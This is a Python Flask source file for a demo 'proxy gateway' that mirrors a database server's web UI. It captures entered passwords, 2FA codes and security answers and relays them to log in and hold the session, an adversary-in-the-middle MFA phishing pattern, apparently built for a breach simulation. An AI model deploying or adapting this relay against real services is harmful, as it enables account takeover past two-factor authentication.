"""
Container 2: Proxy Gateway (demo mode optional)
- Has its own HOME interface for end users to write queries
- Can clone/mirror the original database server UI dynamically (demo only)
- Handles multi-step authentication in demo mode
- Proxies requests transparently
- Connects to database server via HTTPS
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, Response, abort
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from functools import wraps
from datetime import datetime
import importlib
import importlib.util
import secrets
import os
import threading
import hmac
import logging
import sys
from pathlib import Path
from typing import Any, cast

from cachelib.file import FileSystemCache
from flask_session import Session
import redis as redis_lib
from werkzeug.middleware.proxy_fix import ProxyFix
from werkzeug.local import LocalProxy


def _load_sibling_module(module_name: str):
    if __package__:
        return importlib.import_module(f"{__package__}.{module_name}")

    module_path = Path(__file__).with_name(f"{module_name}.py")
    import_name = f"{Path(__file__).parent.name}_{module_name}"
    spec = importlib.util.spec_from_file_location(import_name, module_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Could not load module spec for {module_path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[import_name] = module
    spec.loader.exec_module(module)
    return module


_api_schemas_module = _load_sibling_module("api_schemas")
_api_validation_module = _load_sibling_module("api_validation")
_api_services_module = _load_sibling_module("api_services")

ConnectApiRequest = _api_schemas_module.ConnectApiRequest
QueryApiRequest = _api_schemas_module.QueryApiRequest
TablePathParams = _api_schemas_module.TablePathParams
RequestValidator = _api_validation_module.RequestValidator
RequestPayloadValidationError = _api_validation_module.RequestPayloadValidationError
ProxyApiService = _api_services_module.ProxyApiService

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# Environment / feature flags
APP_ENV = os.environ.get('APP_ENV', 'production').lower()
DEMO_MODE = APP_ENV != 'production'
DEBUG_MODE = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
trust_proxy_env = os.environ.get('TRUST_PROXY')
if trust_proxy_env is None:
    TRUST_PROXY = APP_ENV == 'production'
else:
    TRUST_PROXY = trust_proxy_env.lower() == 'true'

if TRUST_PROXY:
    setattr(app, "wsgi_app", ProxyFix(cast(Any, app.wsgi_app), x_for=1, x_proto=1, x_host=1, x_port=1))

proxy_features_enabled_env = os.environ.get('PROXY_FEATURES_ENABLED')
if proxy_features_enabled_env is None:
    PROXY_FEATURES_ENABLED = DEMO_MODE
else:
    PROXY_FEATURES_ENABLED = proxy_features_enabled_env.lower() == 'true'

# Configuration - Use HTTPS for database server (or HTTP for local testing)
DATABASE_SERVER_URL = os.environ.get('DATABASE_SERVER_URL', 'https://localhost:5001')

# SSL verification setting (False for self-signed certs)
ssl_verify_env = os.environ.get('SSL_VERIFY')
if ssl_verify_env is None:
    SSL_VERIFY = not DEMO_MODE
else:
    SSL_VERIFY = ssl_verify_env.lower() == 'true'

if not SSL_VERIFY:
    urllib3.disable_warnings(InsecureRequestWarning)

app.config['SESSION_COOKIE_HTTPONLY'] = True
cookie_secure_env = os.environ.get('SESSION_COOKIE_SECURE')
if cookie_secure_env is None:
    app.config['SESSION_COOKIE_SECURE'] = APP_ENV == 'production'
else:
    app.config['SESSION_COOKIE_SECURE'] = cookie_secure_env.lower() == 'true'
app.config['SESSION_COOKIE_SAMESITE'] = os.environ.get('SESSION_COOKIE_SAMESITE', 'Lax')

# Logging
logging.basicConfig(level=os.environ.get('LOG_LEVEL', 'INFO'))
logger = logging.getLogger("proxy_clone")

# Server-side sessions (Redis preferred)
REDIS_URL = os.environ.get('REDIS_URL')
if REDIS_URL:
    app.config['SESSION_TYPE'] = 'redis'
    app.config['SESSION_REDIS'] = redis_lib.from_url(REDIS_URL)
    app.config['SESSION_KEY_PREFIX'] = os.environ.get('SESSION_KEY_PREFIX', 'proxy_session:')
else:
    session_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'sessions')
    os.makedirs(session_dir, exist_ok=True)
    app.config['SESSION_TYPE'] = 'cachelib'
    app.config['SESSION_CACHELIB'] = FileSystemCache(cache_dir=session_dir)
Session(app)

def _debug(msg, *args):
    if DEBUG_MODE:
        logger.debug(msg, *args)


def _ensure_csrf_token():
    token = session.get('csrf_token')
    if not token:
        token = secrets.token_urlsafe(32)
        session['csrf_token'] = token
    return token


@app.context_processor
def inject_csrf_token():
    return {'csrf_token': _ensure_csrf_token(), 'demo_mode': DEMO_MODE}


@app.before_request
def enforce_csrf():
    if request.method in ('POST', 'PUT', 'PATCH', 'DELETE'):
        if request.path.startswith('/api/') and request.is_json:
            return
        token = session.get('csrf_token')
        submitted = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
        if not token or not submitted or not hmac.compare_digest(token, submitted):
            abort(400, description='Invalid CSRF token')


@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    if app.config.get('SESSION_COOKIE_SECURE'):
        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response


@app.errorhandler(RequestPayloadValidationError)
def handle_request_payload_validation_error(error):
    return jsonify({'error': 'Invalid request payload', 'details': error.errors}), 400

# Stolen credentials storage (simulates the "breach")
class CredentialVault:
    """
    Stores stolen credentials, 2FA secrets, and session cookies.
    Handles multi-step authentication automatically.
    """
    def __init__(self):
        self.credentials = {}
        self.totp_info = {}  # Stores 2FA-related info
        self.security_info = {}  # Stores security question/answer
        self.session_cookies = {}
        self.active_session = None
        self.last_login = None
        self.auto_refresh_running = False
        self.auth_state = {}  # Tracks multi-step auth state
        self._new_session()

    def _new_session(self):
        """Initialize a fresh requests session with SSL config"""
        self._requests_session = requests.Session()
        self._requests_session.verify = SSL_VERIFY

    def reset_auth(self, clear_credentials=False):
        """Clear stored auth state, cookies, and captured factors"""
        if clear_credentials:
            self.credentials = {}
        self.totp_info = {}
        self.security_info = {}
        self.session_cookies = {}
        self.active_session = None
        self.auth_state = {}
        self.last_login = None
        self._new_session()

    def store_credentials(self, username, password):
        """Store captured credentials - Step 1"""
        self.reset_auth(clear_credentials=False)
        self.credentials = {
            'username': username,
            'password': password,
            'captured_at': datetime.now().isoformat()
        }

    def store_totp_code(self, totp_code):
        """Store captured TOTP code - Step 2"""
        self.totp_info = {
            'last_code': totp_code,
            'captured_at': datetime.now().isoformat()
        }

    def store_security_answer(self, question, answer):
        """Store captured security question/answer - Step 3"""
        self.security_info = {
            'question': question,
            'answer': answer,
            'captured_at': datetime.now().isoformat()
        }

    def store_cookies(self, cookies):
        """Store session cookies"""
        self.session_cookies = dict(cookies)
        self.last_login = datetime.now()

    def get_session(self):
        """Get the requests session with stored cookies"""
        return self._requests_session

    def multi_step_login(self, totp_code=None, security_answer=None):
        """
        Perform multi-step authentication.
        Automatically handles password -> 2FA -> security question flow.
        The proxy only knows what the user provides - it cannot access internal secrets.
        """
        _debug("multi_step_login called - totp_code=%s, security_answer=%s", bool(totp_code), bool(security_answer))
        _debug("current auth_state = %s", self.auth_state)

        if not self.credentials:
            return {'success': False, 'error': 'No credentials stored'}

        try:
            # Determine which step we're on based on what's been provided
            current_step = self.auth_state.get('current_step', 'password')
            _debug("current_step = %s", current_step)

            # If we have a TOTP code and we're waiting for it, go directly to TOTP step
            if totp_code and current_step != 'waiting_security':
                _debug("Sending TOTP code to server...")
                self.store_totp_code(totp_code)
                response = self._requests_session.post(
                    f"{DATABASE_SERVER_URL}/api/login",
                    json={
                        'step': 'totp',
                        'totp_code': totp_code
                    },
                    timeout=10
                )
                data = response.json()

                if response.status_code != 200:
                    # If session state is lost, fall back to password step
                    if 'Invalid session state' in data.get('error', ''):
                        self.auth_state = {'current_step': 'password'}
                    return {'success': False, 'error': data.get('error', '2FA verification failed')}

                # Check what's next
                if data.get('next_step') == 'security':
                    question = data.get('security_question')
                    self.auth_state['current_step'] = 'waiting_security'
                    self.auth_state['security_question'] = question
                    return {
                        'success': False,
                        'error': 'Security question verification required',
                        'requires_security': True,
                        'security_question': question,
                        'message': 'Please answer your security question',
                        'state': data
                    }
                elif data.get('authenticated'):
                    self.store_cookies(self._requests_session.cookies)
                    self.active_session = True
                    self.auth_state = {'authenticated': True, 'user': data.get('user')}
                    return {'success': True, 'data': data}
                else:
                    return {'success': False, 'error': 'Authentication failed after 2FA'}

            # If we have a security answer and we're waiting for it
            if security_answer and current_step == 'waiting_security':
                question = self.auth_state.get('security_question', '')
                self.store_security_answer(question, security_answer)
                response = self._requests_session.post(
                    f"{DATABASE_SERVER_URL}/api/login",
                    json={
                        'step': 'security',
                        'security_answer': security_answer
                    },
                    timeout=10
                )
                data = response.json()

                if response.status_code != 200:
                    return {'success': False, 'error': data.get('error', 'Security verification failed')}

                if data.get('authenticated'):
                    self.store_cookies(self._requests_session.cookies)
                    self.active_session = True
                    self.auth_state = {'authenticated': True, 'user': data.get('user')}
                    return {'success': True, 'data': data}
                else:
                    return {'success': False, 'error': 'Authentication failed after security question'}

            # Step 1: Password authentication (starting fresh)
            self.auth_state = {'current_step': 'password'}
            response = self._requests_session.post(
                f"{DATABASE_SERVER_URL}/api/login",
                json={
                    'step': 'password',
                    'username': self.credentials['username'],
                    'password': self.credentials['password']
                },
                timeout=10
            )

            data = response.json()

            if response.status_code != 200:
                return {'success': False, 'error': data.get('error', 'Password verification failed')}

            # Check if we need 2FA
            if data.get('next_step') == 'totp':
                self.auth_state['current_step'] = 'waiting_totp'
                return {
                    'success': False,
                    'error': 'Two-factor authentication required',
                    'requires_totp': True,
                    'message': 'Please enter your 2FA code from your authenticator app',
                    'state': data
                }

            # Check if we need security question (no 2FA)
            if data.get('next_step') == 'security':
                question = data.get('security_question')
                self.auth_state['current_step'] = 'waiting_security'
                self.auth_state['security_question'] = question
                return {
                    'success': False,
                    'error': 'Security question verification required',
                    'requires_security': True,
                    'security_question': question,
                    'message': 'Please answer your security question',
                    'state': data
                }

            # Check if fully authenticated (no 2FA, no security question)
            if data.get('authenticated'):
                self.store_cookies(self._requests_session.cookies)
                self.active_session = True
                self.auth_state = {'authenticated': True, 'user': data.get('user')}
                return {'success': True, 'data': data}

            return {'success': False, 'error': 'Authentication incomplete', 'state': data}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def login(self, totp_code=None, security_answer=None):
        """Login using stored credentials with multi-step auth support"""
        return self.multi_step_login(totp_code, security_answer)

    def ensure_session(self):
        """Ensure we have a valid session, re-login if needed"""
        if not self.credentials:
            return False

        # Check if session is valid
        try:
            response = self._requests_session.get(
                f"{DATABASE_SERVER_URL}/api/session",
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('authenticated'):
                    return True
        except Exception:
            pass

        # Need to re-login using stored credentials and security info
        result = self.login(security_answer=self.security_info.get('answer'))
        return result.get('success', False)

    def proxy_request(self, method, path, **kwargs):
        """Proxy a request to the database server"""
        if not self.ensure_session():
            return None

        url = f"{DATABASE_SERVER_URL}{path}"

        try:
            if method == 'GET':
                response = self._requests_session.get(url, timeout=30, **kwargs)
            elif method == 'POST':
                response = self._requests_session.post(url, timeout=30, **kwargs)
            else:
                response = self._requests_session.request(method, url, timeout=30, **kwargs)

            return response
        except Exception:
            return None

    def get_status(self):
        """Get current vault status"""
        return {
            'has_credentials': bool(self.credentials),
            'username': self.credentials.get('username'),
            'captured_at': self.credentials.get('captured_at'),
            'has_totp': bool(self.totp_info),
            'has_security_answer': bool(self.security_info.get('answer')),
            'security_question': self.security_info.get('question'),
            'has_session': bool(self.session_cookies),
            'last_login': self.last_login.isoformat() if self.last_login else None,
            'active': self.active_session,
            'auth_state': self.auth_state
        }

    def get_public_status(self):
        """Return non-sensitive status suitable for unauthenticated demo health checks."""
        return {
            'has_credentials': bool(self.credentials),
            'has_totp': bool(self.totp_info),
            'has_security_answer': bool(self.security_info.get('answer')),
            'has_session': bool(self.session_cookies),
            'active': bool(self.active_session),
        }


_VAULTS: dict[str, CredentialVault] = {}
_VAULTS_LOCK = threading.Lock()


def _current_vault() -> CredentialVault:
    vault_id = session.get('vault_id')
    if not vault_id:
        vault_id = secrets.token_urlsafe(16)
        session['vault_id'] = vault_id

    with _VAULTS_LOCK:
        instance = _VAULTS.get(vault_id)
        if instance is None:
            instance = CredentialVault()
            _VAULTS[vault_id] = instance
        return instance


def _drop_current_vault() -> None:
    vault_id = session.pop('vault_id', None)
    if not vault_id:
        return
    with _VAULTS_LOCK:
        _VAULTS.pop(vault_id, None)


vault = LocalProxy(lambda: _current_vault())


def _proxy_api_service() -> Any:
    return ProxyApiService(vault=vault, demo_mode=DEMO_MODE)


def feature_enabled(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not PROXY_FEATURES_ENABLED:
            abort(404)
        return f(*args, **kwargs)
    return decorated


def proxy_authenticated(f):
    """Decorator to ensure proxy has valid credentials"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not vault.credentials:
            return redirect(url_for('connect'))
        if not vault.ensure_session():
            next_step = vault.auth_state.get('current_step')
            if next_step == 'waiting_totp':
                return redirect(url_for('connect', step='totp'))
            if next_step == 'waiting_security':
                return redirect(url_for('connect', step='security'))
            return redirect(url_for('connect'))
        return f(*args, **kwargs)
    return decorated_function


def proxy_status_available(f):
    """Decorator for API status access after a proxy session has captured credentials."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not vault.credentials:
            return jsonify({'error': 'Not connected'}), 401
        return f(*args, **kwargs)
    return decorated_function


# ==================== HOME Interface (Proxy's own UI) ====================

@app.route('/')
def home():
    """Proxy's home page - query interface for end users"""
    if not PROXY_FEATURES_ENABLED:
        return jsonify({'error': 'Proxy demo features are disabled in production'}), 404
    status = vault.get_status()
    return render_template('home.html', status=status)


@app.route('/connect', methods=['GET', 'POST'])
@feature_enabled
def connect():
    """Page to capture/enter credentials - handles multi-step auth"""
    error = None
    status = vault.get_status()

    # Get step from URL args (GET) or form (POST)
    if request.method == 'GET':
        step = request.args.get('step', 'credentials')
    else:
        step = request.form.get('step', 'credentials')

    # Debug logging
    _debug("connect() called - method=%s, step=%s", request.method, step)
    _debug("vault.auth_state = %s", vault.auth_state)
    _debug("vault.credentials = %s", bool(vault.credentials))

    if step in ['totp', 'security'] and not vault.credentials:
        return redirect(url_for('connect', step='credentials'))

    if request.method == 'POST':
        if step == 'credentials':
            username = request.form.get('username')
            password = request.form.get('password')

            # Store the credentials (this is the "breach")
            vault.store_credentials(username, password)

            # Reset auth state for fresh login
            vault.auth_state = {}

            # Try to login - Step 1
            result = vault.login()
            _debug("credentials login result: %s", result)

            if result.get('success'):
                return redirect(url_for('home'))
            elif result.get('requires_totp'):
                # Need 2FA code - redirect to step 2
                _debug("Redirecting to totp step, auth_state = %s", vault.auth_state)
                return redirect(url_for('connect', step='totp'))
            elif result.get('requires_security'):
                # Need security answer - redirect to step 3
                session['security_question'] = result.get('security_question')
                return redirect(url_for('connect', step='security'))
            else:
                error = result.get('error', 'Failed to connect')

        elif step == 'totp':
            totp_code = request.form.get('totp_code', '').strip()
            _debug("totp step - totp_code=%s, auth_state=%s", totp_code, vault.auth_state)

            # Server-side validation: require 6 digits
            if not totp_code:
                error = 'Please enter the 2FA code'
            elif not totp_code.isdigit() or len(totp_code) != 6:
                error = '2FA code must be exactly 6 digits'
            else:
                # Continue auth with TOTP - Step 2
                result = vault.login(totp_code=totp_code)
                _debug("totp login result: %s", result)

                if result.get('success'):
                    return redirect(url_for('home'))
                elif result.get('requires_security'):
                    session['security_question'] = result.get('security_question')
                    return redirect(url_for('connect', step='security'))
                else:
                    error = result.get('error', 'Invalid 2FA code')
                    # Stay on TOTP step to retry

        elif step == 'security':
            security_answer = request.form.get('security_answer', '').strip()

            if not security_answer:
                error = 'Please enter your security answer'
            else:
                # Continue auth with security answer - Step 3
                result = vault.login(security_answer=security_answer)
                _debug("security login result: %s", result)

                if result.get('success'):
                    return redirect(url_for('home'))
                else:
                    error = result.get('error', 'Invalid security answer')
                    # Stay on security step to retry

    # Get security question from session or vault
    security_question = session.get('security_question') or vault.auth_state.get('security_question')

    return render_template('connect.html',
                          error=error,
                          status=status,
                          step=step,
                          security_question=security_question)


@app.route('/disconnect', methods=['POST'])
@feature_enabled
def disconnect():
    """Clear stored credentials and all captured auth info"""
    vault.reset_auth(clear_credentials=True)
    _drop_current_vault()
    session.pop('security_question', None)
    return redirect(url_for('connect'))


# ==================== Clone/Mirror Original UI ====================

@app.route('/mirror/')
@app.route('/mirror/<path:path>')
@feature_enabled
@proxy_authenticated
def mirror(path=''):
    """
    Mirror/Clone the original database server UI dynamically.
    Fetches pages from the database server and serves them through the proxy.
    """
    # Proxy the request to the database server
    response = vault.proxy_request('GET', f'/{path}')

    if response is None:
        return "Failed to connect to database server", 503

    # Get the content
    content = response.content
    content_type = response.headers.get('Content-Type', 'text/html')

    # If it's HTML, we can optionally modify it (add proxy banner, etc.)
    if 'text/html' in content_type:
        content = content.decode('utf-8')

        # Add a banner to show this is the mirrored version
        banner = '''
        <div style="position:fixed;top:0;left:0;right:0;background:linear-gradient(90deg,#dc3545,#c82333);
                    color:white;text-align:center;padding:8px;z-index:9999;font-size:14px;">
            <i class="bi bi-shield-exclamation"></i>
            <strong>PROXY MIRROR</strong> - You are viewing through the proxy gateway
            <a href="/" style="color:white;margin-left:20px;">← Back to Proxy Home</a>
        </div>
        <style>body{margin-top:40px !important;}.sidebar{top:40px !important;height:calc(100vh - 40px) !important;}</style>
        '''

        # Insert banner after <body> tag
        content = content.replace('<body>', f'<body>{banner}')

        # Rewrite links to go through the mirror
        content = content.replace('href="/', 'href="/mirror/')
        content = content.replace("href='/", "href='/mirror/")
        content = content.replace('action="/', 'action="/mirror/')

        content = content.encode('utf-8')

    return Response(content, content_type=content_type, status=response.status_code)


@app.route('/mirror/api/<path:path>', methods=['GET', 'POST'])
@feature_enabled
@proxy_authenticated
def mirror_api(path):
    """Mirror API calls to the database server"""
    if request.method == 'POST':
        response = vault.proxy_request('POST', f'/api/{path}', json=request.get_json())
    else:
        response = vault.proxy_request('GET', f'/api/{path}')

    if response is None:
        return jsonify({'error': 'Failed to connect to database server'}), 503

    return Response(
        response.content,
        content_type=response.headers.get('Content-Type'),
        status=response.status_code
    )


# ==================== Proxy's Own API ====================

@app.route('/api/health')
@feature_enabled
def api_health():
    """Minimal health endpoint with no sensitive state."""
    return jsonify(_proxy_api_service().health())


@app.route('/api/status')
@feature_enabled
@proxy_status_available
def api_status():
    """Get proxy status"""
    return jsonify(_proxy_api_service().status())


@app.route('/api/connect', methods=['POST'])
@feature_enabled
def api_connect():
    """API endpoint to connect with credentials"""
    payload = RequestValidator.parse_json(request, ConnectApiRequest)
    body, status = _proxy_api_service().connect(payload)
    return jsonify(body), status


@app.route('/api/query', methods=['POST'])
@feature_enabled
def api_query():
    """Execute query through the proxy"""
    if not vault.ensure_session():
        return jsonify({'error': 'Not connected to database server'}), 401

    payload = RequestValidator.parse_json(request, QueryApiRequest)
    query = payload.query

    response = vault.proxy_request('POST', '/api/query', json={'query': query})

    if response is None:
        return jsonify({'error': 'Failed to connect to database server'}), 503

    return Response(
        response.content,
        content_type='application/json',
        status=response.status_code
    )


@app.route('/api/tables')
@feature_enabled
def api_tables():
    """Get tables through the proxy"""
    if not vault.ensure_session():
        return jsonify({'error': 'Not connected'}), 401

    response = vault.proxy_request('GET', '/api/tables')

    if response is None:
        return jsonify({'error': 'Failed to connect'}), 503

    return Response(response.content, content_type='application/json')


@app.route('/api/table/<table_name>')
@feature_enabled
def api_table_data(table_name):
    """Get table data through the proxy"""
    if not vault.ensure_session():
        return jsonify({'error': 'Not connected'}), 401

    path_params = RequestValidator.parse_mapping({'table_name': table_name}, TablePathParams, source='path')

    response = vault.proxy_request('GET', f'/api/table/{path_params.table_name}')

    if response is None:
        return jsonify({'error': 'Failed to connect'}), 503

    return Response(response.content, content_type='application/json')


if __name__ == '__main__':
    # Check if SSL certificates exist for HTTPS
    ssl_paths = [
        ('/app/certs/cert.pem', '/app/certs/key.pem'),  # Docker path
        ('certs/cert.pem', 'certs/key.pem'),  # Local path
    ]

    ssl_cert = None
    ssl_key = None

    for cert_path, key_path in ssl_paths:
        if os.path.exists(cert_path) and os.path.exists(key_path):
            ssl_cert = cert_path
            ssl_key = key_path
            break

    PORT = int(os.environ.get('PORT', 8080))

    if ssl_cert and ssl_key:
        logger.info("Starting proxy with HTTPS on port %s (cert: %s)...", PORT, ssl_cert)
        app.run(host='0.0.0.0', port=PORT, debug=DEBUG_MODE, ssl_context=(ssl_cert, ssl_key))
    else:
        logger.info("SSL certificates not found. Starting proxy with HTTP on port %s...", PORT)
        app.run(host='0.0.0.0', port=PORT, debug=DEBUG_MODE)
